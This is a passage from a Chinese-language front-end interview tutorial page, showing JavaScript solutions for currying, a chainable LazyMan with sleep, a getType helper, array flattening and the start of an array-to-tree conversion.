            <span class="token keyword">return</span> calc
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// 参数够了，返回执行结果</span>
            <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> fnArgsLength<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 传入超过fnArgsLength长度的参数没有意义</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 返回一个函数</span>
    <span class="token keyword">return</span> calc
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> a <span class="token operator">+</span> b <span class="token operator">+</span> c
<span class="token punctuation">}</span>
<span class="token comment">// add(10, 20, 30) // 60</span>

<span class="token keyword">var</span> curryAdd <span class="token operator">=</span> <span class="token function">curry</span><span class="token punctuation">(</span>add<span class="token punctuation">)</span>
<span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">curryAdd</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token comment">// 60</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
</code></pre></div><h3 id="手写一个lazyman-实现sleep机制"><a href="#手写一个lazyman-实现sleep机制" class="header-anchor">#</a> 手写一个LazyMan，实现sleep机制</h3> <ul><li>支持<code>sleep</code>和<code>eat</code>两个方法</li> <li>支持链式调用</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// LazyMan示例</span>

<span class="token keyword">const</span> me <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LazyMan</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span>
me<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'苹果'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'香蕉'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'葡萄'</span><span class="token punctuation">)</span>

<span class="token comment">// 打印</span>
<span class="token comment">// 张三 eat 苹果</span>
<span class="token comment">// 张三 eat 香蕉</span>
<span class="token comment">// 等待5秒</span>
<span class="token comment">// 张三 eat 葡萄</span>
</code></pre></div><p><strong>思路</strong></p> <ul><li>由于有<code>sleep</code>功能，函数不能直接在调用时触发</li> <li>初始化一个列表，把函数注册进去</li> <li>由每个<code>item</code>触发<code>next</code>执行（遇到<code>sleep</code>则异步触发，使用<code>setTimeout</code>）</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/2600c71b11497adf.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * @description lazy man
 */</span>

<span class="token keyword">class</span> <span class="token class-name">LazyMan</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name

        <span class="token keyword">this</span><span class="token punctuation">.</span>tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 任务列表</span>

        <span class="token comment">// 等注册完后在初始执行next</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> task <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 取出当前 tasks 的第一个任务</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>task<span class="token punctuation">)</span> <span class="token function">task</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token function">eat</span><span class="token punctuation">(</span><span class="token parameter">food</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token function-variable function">task</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> eat </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>food<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 立刻执行下一个任务</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token keyword">this</span> <span class="token comment">// 链式调用</span>
    <span class="token punctuation">}</span>

    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token function-variable function">task</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 开始睡觉</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 已经睡完了 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>seconds<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">s，开始执行下一个任务</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// xx 秒之后再执行下一个任务</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token keyword">this</span> <span class="token comment">// 链式调用</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">const</span> me <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LazyMan</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span>
me<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'苹果'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'香蕉'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'葡萄'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'西瓜'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'橘子'</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="手写一个gettype函数-获取详细的数据类型"><a href="#手写一个gettype函数-获取详细的数据类型" class="header-anchor">#</a> 手写一个getType函数，获取详细的数据类型</h3> <ul><li><strong>获取类型</strong> <ul><li>手写一个getType函数，传入任意变量，可准确获取类型</li> <li>如<code>number</code>、<code>string</code>、<code>boolean</code>等值类型</li> <li>引用类型<code>object</code>、<code>array</code>、<code>map</code>、<code>regexp</code></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 获取详细的数据类型
 * @param x x
 */</span>
<span class="token keyword">function</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> originType <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">// '[object String]'</span>
  <span class="token keyword">const</span> spaceIndex <span class="token operator">=</span> originType<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> type <span class="token operator">=</span> originType<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>spaceIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 'String' -1不要右边的]</span>
  <span class="token keyword">return</span> type<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 'string'</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// null</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// number</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// string</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// boolean</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// symbol</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// object</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// array</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// function</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// date</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// regexp</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// map</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// set</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// weakmap</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WeakSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// weakset</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// error</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// promise</span>
</code></pre></div><h3 id="手写一个js函数-实现数组扁平化array-flatten"><a href="#手写一个js函数-实现数组扁平化array-flatten" class="header-anchor">#</a> 手写一个JS函数，实现数组扁平化Array Flatten</h3> <ul><li>写一个JS函数，实现数组扁平化，只减少一次嵌套</li> <li>如输入<code>[1,[2,[3]],4]</code> 输出<code>[1,2,[3],4]</code></li></ul> <p><strong>思路</strong></p> <ul><li>定义空数组<code>arr=[]</code> 遍历当前数组</li> <li>如果<code>item</code>非数组，则累加到<code>arr</code></li> <li>如果<code>item</code>是数组，则遍历之后累加到<code>arr</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 数组扁平化，使用 push
 * @param arr arr
 */</span>
<span class="token keyword">function</span> <span class="token function">flatten1</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      item<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">n</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 数组扁平化，使用 concat
 * @param arr arr
 */</span>
<span class="token keyword">function</span> <span class="token function">flatten2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    res <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">flatten2</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>连环问：手写一个JS函数，实现数组深度扁平化</strong></p> <ul><li>如输入<code>[1, [2, [3]], 4]</code> 输出<code>[1,2,3,4]</code></li></ul> <p><strong>思路</strong></p> <ul><li>先实现一级扁平化，然后递归调用，直到全部扁平化</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 数组深度扁平化，使用 push
 * @param arr arr
 */</span>
<span class="token keyword">function</span> <span class="token function">flattenDeep1</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> flatItem <span class="token operator">=</span> <span class="token function">flattenDeep1</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token comment">// 递归</span>
      flatItem<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">n</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 数组深度扁平化，使用 concat
 * @param arr arr
 */</span>
<span class="token keyword">function</span> <span class="token function">flattenDeep2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> flatItem <span class="token operator">=</span> <span class="token function">flattenDeep2</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token comment">// 递归</span>
      res <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>flatItem<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      res <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token boolean">true</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">flattenDeep2</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">)</span>
</code></pre></div><h3 id="把一个数组转换为树"><a href="#把一个数组转换为树" class="header-anchor">#</a> 把一个数组转换为树</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门A'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门B'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门C'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门D'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门E'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'部门F'</span><span class="token punctuation">,</span> <span class="token literal-property property">parentId</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/b35e3101a79fe1b6.png" loading="lazy" class="lazy"></p> <p><strong>树节点</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">interface</span> <span class="token class-name">ITreeNode</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">id</span><span class="token operator">:</span>number
  <span class="token literal-property property">name</span><span class="token operator">:</span> string
  children<span class="token operator">?</span><span class="token operator">:</span> ITreeNode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 子节点</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>思路</strong></p> <ul><li>遍历数组</li> <li>每个元素生成<code>TreeNode</code></li> <li>找到<code>parentNode</code>，并加入它的<code>children</code> <ul><li>如何找到<code>parentNode</code> <ul><li>遍历数组去查找太慢</li> <li>可用一个<code>Map</code>来维护关系，便于查找</li></ul></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * @description array to tree
 */</span>

<span class="token comment">// 数据结构</span>
<span class="token keyword">interface</span> <span class="token class-name">ITreeNode</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">id</span><span class="token operator">:</span> number
  <span class="token literal-property property">name</span><span class="token operator">:</span> string
  children<span class="token operator">?</span><span class="token operator">:</span> ITreeNode<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">arr2tree</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 用于 id 和 treeNode 的映射</span>
  <span class="token keyword">const</span> idToTreeNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token comment">// 返回一棵树 tree rootNode</span>

  arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> parentId <span class="token punctuation">}</span> <span class="token operator">=</span> item

    <span class="token comment">// 定义 tree node 并加入 map</span>
    <span class="token keyword">const</span> treeNode <span class="token operator">=</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> name <span class="token punctuation">}</span>
    idToTreeNode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> treeNode<span class="token punctuation">)</span>

    <span class="token comment">// 找到 parentNode 并加入到它的 children</span>
